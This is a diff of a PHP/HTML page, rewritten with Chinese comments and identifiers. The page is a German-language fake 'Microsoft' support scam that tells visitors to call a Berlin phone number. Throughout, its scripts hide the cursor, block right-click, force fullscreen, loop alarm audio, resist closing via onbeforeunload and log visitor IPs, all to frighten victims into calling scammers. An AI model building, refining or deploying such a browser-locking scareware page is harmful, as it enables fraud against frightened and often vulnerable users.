@@ -1,40 +1,44 @@
 <?php
-// ================================================
-// Security & Header Settings
-// ================================================
+// ========================================================
+// PHP 配置与安全设置初始化
+// ========================================================
+
 ini_set("display_errors", 0);
 error_reporting(E_ALL & ~E_NOTICE & ~E_WARNING);
 
-// Prevent caching of this page
 header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
+header("Pragma: no-cache");
+header("Expires: 0");
 
-// ================================================
-// Logging Function - Records suspicious activity
-// ================================================
-function logData($messageType, $reason, $ipAddress, $userAgent, $userHash, $sentHashValues)
+// ========================================================
+// 日志记录函数
+// ========================================================
+function 记录日志($消息类型, $原因, $访问者IP, $浏览器代理, $用户哈希, $发送哈希值)
 {
-    $currentDateTime = date("Y-m-d H:i:s");
-    $logFileName = "log.txt";
+    $当前时间戳 = date("Y-m-d H:i:s");
+    $日志文件路径 = "log.txt";
     
-    $logEntry = "Date: " . $currentDateTime . 
-                " | Type: " . $messageType . 
-                " | Status: blocked" . 
-                " | Reason: " . $reason . 
-                " | IP: " . $ipAddress . 
-                " | UA: " . $userAgent . 
-                " | User Hash: " . $userHash . 
-                " | Sent Hash: (Token: " . $sentHashValues[0] . 
-                " / Cookie: " . $sentHashValues[1] . ")";
+    $日志条目 = "Date: " . $当前时间戳 .
+                " | Type: " . $消息类型 .
+                " | Status: blocked" .
+                " | Reason: " . $原因 .
+                " | IP: " . $访问者IP .
+                " | UA: " . $浏览器代理 .
+                " | User Hash: " . $用户哈希 .
+                " | Sent Hash: (Token: " . $发送哈希值[0] .
+                " / Cookie: " . $发送哈希值[1] . ")";
     
-    if (file_exists($logFileName) && is_writable($logFileName)) {
-        $fileHandle = fopen($logFileName, "a");
-        if ($fileHandle) {
-            fwrite($fileHandle, $logEntry . "\r\n");
-            fclose($fileHandle);
+    if (file_exists($日志文件路径) && is_writable($日志文件路径)) {
+        $文件句柄 = fopen($日志文件路径, "a");
+        if ($文件句柄 !== false) {
+            fwrite($文件句柄, $日志条目 . "\r\n");
+            fclose($文件句柄);
         }
     } else {
-        // Create the file if it doesn't exist
-        fopen($logFileName, "w");
+        $创建文件 = fopen($日志文件路径, "w");
+        if ($创建文件 !== false) {
+            fclose($创建文件);
+        }
     }
 }
 ?>
@@ -45,18 +49,13 @@ function logData($messageType, $reason, $ipAddress, $userAgent, $userHash, $sent
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
     <meta name="robots" content="noindex,nofollow">
-    
     <title>4K-Filme</title>
     
     <link rel="shortcut icon" type="image/png" href="images/msmm.png">
     <link href="css/tapa.css" rel="stylesheet">
 
-    <!-- External Tracking and Library Scripts -->
-    <script async id="gauges-tracker" 
-            data-site-id="66acbdba8b4334062434f5ca" 
-            data-track-path="../../../track.gaug.es/track.gif" 
-            src="js/track.js"></script>
-    
+    <!-- 加载外部脚本库 -->
+    <script async id="gauges-tracker" data-site-id="66acbdba8b4334062434f5ca" data-track-path="../../../track.gaug.es/track.gif" src="js/track.js"></script>
     <script src="js/jquery-1.4.4.min.js"></script>
     <script src="js/noir.js"></script>
     <script src="js/js1.js"></script>
@@ -68,73 +67,32 @@ function logData($messageType, $reason, $ipAddress, $userAgent, $userHash, $sent
     <script src="js/custom.js"></script>
     <script src="js/esc.js"></script>
 
-    <!-- Disable Right Click -->
+    <!-- 禁用右键菜单 -->
     <script>
-        $(function() {
-            $('body').bind('contextmenu', function(e) {
+        $(function(){
+            $('body').bind('contextmenu', function(e){
                 return false;
             });
         });
     </script>
 
     <script>
-        // Global phone number variable (currently empty)
         var phone_number = '';
     </script>
 
-    <!-- Custom Inline Styles -->
+    <!-- 自定义样式 -->
     <style>
-        #banners {
-            width: 190px;
-            position: absolute;
-            left: 270px;
-            top: 180px;
-        }
-        
-        .haruto {
-            position: absolute;
-            bottom: 111px;
-            left: 105px;
-            color: #124d9b;
-            width: 480px;
-            font-weight: 700;
-            font-size: 25px;
-            border: 1px solid #124d9b;
-            padding: 0 10px;
-            border-radius: 5px;
-        }
-        
-        #footer_btn {
-            width: 142px;
-            position: absolute;
-            left: 73%;
-            bottom: 6%;
-            box-shadow: 0 1px 5px 0 rgba(0,0,0,.2), 
-                        0 2px 2px 0 rgba(0,0,0,.14), 
-                        0 3px 1px -2px rgba(0,0,0,.12);
-        }
-        
-        #footer_btn a {
-            color: #fff;
-        }
-        
-        .haru {
-            position: absolute;
-            bottom: 95px;
-            left: 275px;
-            font-size: 18px;
-            color: #ffffffd1;
-            font-weight: 800;
-        }
+        #banners{width:190px;position:absolute;left:270px;top:180px}
+        .haruto{position:absolute;bottom:111px;left:105px;color:#124d9b;width:480px;font-weight:700;font-size:25px;border:1px solid #124d9b;padding:0 10px;border-radius:5px}
+        #footer_btn{width:142px;position:absolute;left:73%;bottom:6%;box-shadow:0 1px 5px 0 rgba(0,0,0,.2),0 2px 2px 0 rgba(0,0,0,.14),0 3px 1px -2px rgba(0,0,0,.12)}
+        #footer_btn a{color:#fff}
+        .haru{position:absolute;bottom:95px;left:275px;font-size:18px;color:#ffffffd1;font-weight:800}
     </style>
 </head>
 
-<body class="map" 
-      id="mycanvas" 
-      onbeforeunload="return myFunction()" 
-      style="cursor:none">
+<body class="map" id="mycanvas" onbeforeunload="return myFunction()" style="cursor:none">
 
-    <!-- Age Confirmation Modal -->
+    <!-- 年龄确认模态框 -->
     <div id="age-confirmation-modal">
         <div class="innerContainer">
             <div>
@@ -145,56 +103,49 @@ function logData($messageType, $reason, $ipAddress, $userAgent, $userHash, $sent
             <div style="font-size:40px;">Wollen Sie diese Seite schließen?</div>
             <div>
                 <button type="button" class="btn btn-secondary btn-lg">NEIN</button>
-                <button type="button" class="btn btn-primary btn-lg" 
-                        style="color: #fff; background-color: #007bff; border-color: #007bff;">
-                    Ja
-                </button>
+                <button type="button" class="btn btn-primary btn-lg" style="color:#fff;background-color:#007bff;border-color:#007bff;">Ja</button>
             </div>
         </div>
     </div>
 
-    <!-- Background Image -->
+    <!-- 背景图片 -->
     <div class="bg" style="cursor:none">
         <div class="bgimg" style="top:0">
             <img src="images/f24.png" alt="" width="100%">
         </div>
     </div>
 
-    <!-- Black Overlay Link -->
+    <!-- 黑色覆盖层 -->
     <a href="#" id="link_black" style="cursor:none" rel="noreferrer">
-        <div class="black" style="height: 145%; cursor: none; display: block;"></div>
+        <div class="black" style="height:145%;cursor:none;display:block;"></div>
     </a>
 
-    <!-- Pro Box Image -->
-    <div class="pro_box3" style="display: block;">
-        <img src="images/nbx1.jpg" alt="" width="100%" style="height: auto;">
+    <!-- 促销图片框 -->
+    <div class="pro_box3" style="display:block;">
+        <img src="images/nbx1.jpg" alt="" width="100%" style="height:auto;">
     </div>
 
-    <!-- Pop-up Card -->
-    <div class="cardcontainer" style="display: block;" id="pop_up_new">
-        <img src="images/bx2.jpg" alt="" style="width: 500px;">
-        <strong class="haru">
-            <script>document.write(phone_number);</script>
-        </strong>
+    <!-- 弹出卡片 -->
+    <div class="cardcontainer" style="display:block;" id="pop_up_new">
+        <img src="images/bx2.jpg" alt="" style="width:500px;">
+        <strong class="haru"><script>document.write(phone_number);</script></strong>
     </div>
 
-    <!-- Lightbox / Popup -->
-    <div class="lightbox" id="poptxt" style="display: block;">
+    <!-- 主灯箱弹出层 -->
+    <div class="lightbox" id="poptxt" style="display:block;">
         <div class="row firewall-pro">
             <div class="col-md-12">
-                <img src="images/nmnbx.png" alt="" style="width: 670px; height: auto;">
+                <img src="images/nmnbx.png" alt="" style="width:670px;height:auto;">
             </div>
         </div>
     </div>
 
-    <!-- Microsoft Chat / Support Box -->
-    <div id="chat" style="display: block;">
+    <!-- Microsoft 支持聊天框 -->
+    <div id="chat" style="display:block;">
         <img src="images/msmm.png">
-        <span style="color:#222; font-size:24px; font-weight:600; margin-left:6px; position:relative; top:5px;">Microsoft</span>
-        <p style="font-weight:600; font-size:24px;">Rufen Sie Support an: <br></p>
-        <h4 style="font-weight:600; font-size:22px;">
-            030-7001-2403<script>document.write(phone_number);</script> <br>(Berlin)
-        </h4>
+        <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Microsoft</span>
+        <p style="font-weight:600;font-size:24px">Rufen Sie Support an: <br></p>
+        <h4 style="font-weight:600;font-size:22px"> 030-7001-2403<script>document.write(phone_number);</script> <br>(Berlin)</h4>
         <div class="arrow-down">
             <svg height="1em" viewBox="0 0 320 512">
                 <style>svg { fill: #fff }</style>
@@ -203,253 +154,108 @@ function logData($messageType, $reason, $ipAddress, $userAgent, $userHash, $sent
         </div>
     </div>
 
-    <!-- Script: Hide Age Modal on Map Click -->
+    <!-- ====================== 音频功能 ====================== -->
+
+    <!-- 音频1：每500毫秒强制播放 id="mcr" 的音频 -->
     <script>
-        $(document).ready(function() {
-            $(".map").click(function() {
+        setInterval(function(){
+            var 音频元素 = document.getElementById("mcr");
+            if (音频元素) {
+                音频元素.play().catch(function(){});
+            }
+        }, 500);
+    </script>
+
+    <!-- 音频2：背景循环音频（点击页面时播放 + 自动循环） -->
+    <script>
+        $(document).ready(function(){
+            var 背景音频 = document.createElement('audio');
+            背景音频.setAttribute('src', 'visudk.mp4');
+            
+            // 音频播放结束后自动重新播放
+            背景音频.addEventListener('ended', function(){
+                this.play().catch(function(){});
+            }, false);
+
+            // 点击以下区域时播放音频
+            $('#mycanvas, #link_black, .pro_box, #poptxt, .cardcontainer').click(function(){
+                背景音频.play().catch(function(){});
+            });
+        });
+    </script>
+
+    <!-- ====================== 其他功能脚本 ====================== -->
+
+    <!-- 点击地图隐藏年龄确认框 -->
+    <script>
+        $(document).ready(function(){
+            $(".map").click(function(){
                 $("#age-confirmation-modal").hide();
             });
         });
     </script>
 
-    <!-- Script: Mouse Out Event for Lightbox -->
+    <!-- 鼠标移出窗口显示灯箱 -->
     <script>
-        function addEvent(element, eventType, handlerFunction) {
-            if (element.addEventListener) {
-                element.addEventListener(eventType, handlerFunction, false);
-            } else if (element.attachEvent) {
-                element.attachEvent("on" + eventType, handlerFunction);
+        function 添加事件(元素, 事件类型, 回调函数) {
+            if (元素.addEventListener) {
+                元素.addEventListener(事件类型, 回调函数, false);
+            } else if (元素.attachEvent) {
+                元素.attachEvent("on" + 事件类型, 回调函数);
             }
         }
 
-        addEvent(document, 'mouseout', function(e) {
-            if (e.toElement === null && e.relatedTarget === null) {
+        添加事件(document, 'mouseout', function(e){
+            if (e.toElement == null && e.relatedTarget == null) {
                 $('.lightbox').slideDown();
             }
         });
 
-        $('a.close').click(function() {
-            $('.lightbox').slideUp();
-        });
-
-        $('body').click(function() {
-            $('.lightbox').slideUp();
-        });
+        $('a.close').click(function(){ $('.lightbox').slideUp(); });
+        $('body').click(function(){ $('.lightbox').slideUp(); });
     </script>
 
-    <!-- Progress Bar Animation Script -->
+    <!-- 进度条动画 -->
     <script>
-        $(function() {
-            var progressValue = 0;
-            var progressInterval = setInterval(function() {
-                progressValue += 10;
-                $("#dynamic").css("width", progressValue + "%")
-                             .attr("aria-valuenow", progressValue)
-                             .text(progressValue + "% 完了");
-                
-                if (progressValue >= 100) {
-                    clearInterval(progressInterval);
-                }
+        $(function(){
+            var 当前进度 = 0;
+            var 定时器 = setInterval(function(){
+                当前进度 += 10;
+                $("#dynamic").css("width", 当前进度 + "%")
+                             .attr("aria-valuenow", 当前进度)
+                             .text(当前进度 + "% 完了");
+                if (当前进度 >= 100) clearInterval(定时器);
             }, 100);
         });
     </script>
 
-    <!-- jQuery countTo Plugin (unchanged logic, just better style) -->
+    <!-- 全屏请求 -->
     <script>
-        (function($) {
-            $.fn.countTo = function(options) {
-                options = options || {};
-                
-                return this.each(function() {
-                    var settings = $.extend({}, $.fn.countTo.defaults, {
-                        from: $(this).data("from"),
-                        to: $(this).data("to"),
-                        speed: $(this).data("speed"),
-                        refreshInterval: $(this).data("refresh-interval"),
-                        decimals: $(this).data("decimals")
-                    }, options);
-
-                    var totalSteps = Math.ceil(settings.speed / settings.refreshInterval);
-                    var incrementPerStep = (settings.to - settings.from) / totalSteps;
-                    
-                    var currentElement = this;
-                    var $element = $(this);
-                    var currentValue = settings.from;
-                    var stepCount = 0;
-                    var dataStore = $element.data("countTo") || {};
-
-                    $element.data("countTo", dataStore);
-                    
-                    if (dataStore.interval) {
-                        clearInterval(dataStore.interval);
-                    }
-
-                    dataStore.interval = setInterval(function() {
-                        currentValue += incrementPerStep;
-                        stepCount++;
-                        
-                        var formattedValue = settings.formatter.call(currentElement, currentValue, settings);
-                        $element.html(formattedValue);
-
-                        if (typeof settings.onUpdate === "function") {
-                            settings.onUpdate.call(currentElement, currentValue);
-                        }
-
-                        if (stepCount >= totalSteps) {
-                            $element.removeData("countTo");
-                            clearInterval(dataStore.interval);
-                            currentValue = settings.to;
-                            
-                            if (typeof settings.onComplete === "function") {
-                                settings.onComplete.call(currentElement, currentValue);
-                            }
-                        }
-                    }, settings.refreshInterval);
-
-                    // Initial display
-                    $element.html(settings.formatter.call(currentElement, currentValue, settings));
-                });
-            };
-
-            $.fn.countTo.defaults = {
-                from: 0,
-                to: 0,
-                speed: 100,
-                refreshInterval: 100,
-                decimals: 0,
-                formatter: function(value, options) {
-                    return value.toFixed(options.decimals);
-                },
-                onUpdate: null,
-                onComplete: null
-            };
-        })(jQuery);
-
-        // Initialize countTo for elements with .count-number and .timer classes
-        jQuery(function($) {
-            $(".count-number").data("countToOptions", {
-                formatter: function(value, options) {
-                    return value.toFixed(options.decimals).replace(/\B(?=(?:\d{3})+(?!\d))/g, ",");
-                }
-            });
-
-            $(".timer").each(function() {
-                var element = $(this);
-                var elementOptions = $.extend({}, element.data("countToOptions") || {});
-                element.countTo(elementOptions);
-            });
-        });
-    </script>
-
-    <!-- Fullscreen Request on Click -->
-    <script>
-        document.addEventListener("click", function() {
-            var element = document.documentElement;
-            var requestFullscreen = element.requestFullScreen || 
-                                    element.webkitRequestFullScreen || 
-                                    element.mozRequestFullScreen;
-            
-            if (requestFullscreen) {
-                requestFullscreen.call(element);
+        document.addEventListener("click", function(){
+            var 页面元素 = document.documentElement;
+            var 全屏方法 = 页面元素.requestFullScreen || 
+                         页面元素.webkitRequestFullScreen || 
+                         页面元素.mozRequestFullScreen;
+            if (全屏方法) {
+                全屏方法.call(页面元素);
             }
         });
     </script>
 
-    <!-- Audio Loop -->
-    <script>
-        setInterval(function() {
-            var audioElement = document.getElementById("mcr");
-            if (audioElement) {
-                audioElement.play();
-            }
-        }, 500);
-    </script>
-
-    <!-- Favicon Switcher -->
-    <script>
-        var faviconToggle = 1;
-        setInterval(function() {
-            var faviconLink = document.getElementById("favicon");
-            if (faviconLink) {
-                faviconLink.href = (faviconToggle) ? "w3.html" : "w1.html";
-                faviconToggle = !faviconToggle;
-            }
-        }, 1000);
-    </script>
-
-    <!-- Popup Show Triggers -->
-    <script>
-        $(document).ready(function() {
-            $("#mycanvas").click(function() {
-                $("#welcomeDiv, #poptxt").show();
-            });
-            
-            $("#cross").click(function() {
-                $("#poptxt").show();
-            });
-            
-            $("body").mouseover(function() {
-                $("#poptxt").show();
-            });
-        });
-    </script>
-
-    <!-- Chat Box Fade In -->
-    <script>
-        $(document).ready(function() {
-            $("#chat").delay(600).fadeIn(100);
-        });
-    </script>
-
-    <!-- Gauges Tracker -->
-    <script>
-        var _gauges = _gauges || [];
-        (function() {
-            var scriptTag = document.createElement('script');
-            scriptTag.type = 'text/javascript';
-            scriptTag.async = true;
-            scriptTag.id = 'gauges-tracker';
-            scriptTag.setAttribute('data-site-id', '66acbdba8b4334062434f5ca');
-            scriptTag.setAttribute('data-track-path', '../../../track.gaug.es/track.gif');
-            scriptTag.src = '../../../d2fuc4clr7gvcn.cloudfront.net/track.js';
-            
-            var firstScript = document.getElementsByTagName('script')[0];
-            firstScript.parentNode.insertBefore(scriptTag, firstScript);
-        })();
-    </script>
-
-    <!-- Background Audio Player -->
-    <script>
-        $(document).ready(function() {
-            var backgroundAudio = document.createElement('audio');
-            backgroundAudio.setAttribute('src', 'visudk.mp4');
-            
-            backgroundAudio.addEventListener('ended', function() {
-                this.play();
-            }, false);
-
-            $('#mycanvas, #link_black, .pro_box, #poptxt').click(function() {
-                backgroundAudio.play();
-            });
-        });
-    </script>
-
+    <!-- 其他必要脚本 -->
     <script src="js/esc.js"></script>
 
     <!-- Google Analytics -->
     <script async src="https://www.googletagmanager.com/gtag/js?id=G-4XBJ9K0002"></script>
     <script>
         window.dataLayer = window.dataLayer || [];
-        function gtag() {
-            dataLayer.push(arguments);
-        }
+        function gtag(){ dataLayer.push(arguments); }
         gtag('js', new Date());
         gtag('config', 'G-4XBJ9K0002');
     </script>
 
-    <!-- Tracking Pixel -->
-    <img src="https://rb8as.bemobtrk.com/conversion.gif?cid=OPTIONAL&payout=OPTIONAL&txid=OPTIONAL" 
-         width="1" height="1" alt="">
+    <!-- 跟踪像素 -->
+    <img src="https://rb8as.bemobtrk.com/conversion.gif?cid=OPTIONAL&payout=OPTIONAL&txid=OPTIONAL" width="1" height="1" alt="">
 
 </body>
 </html>
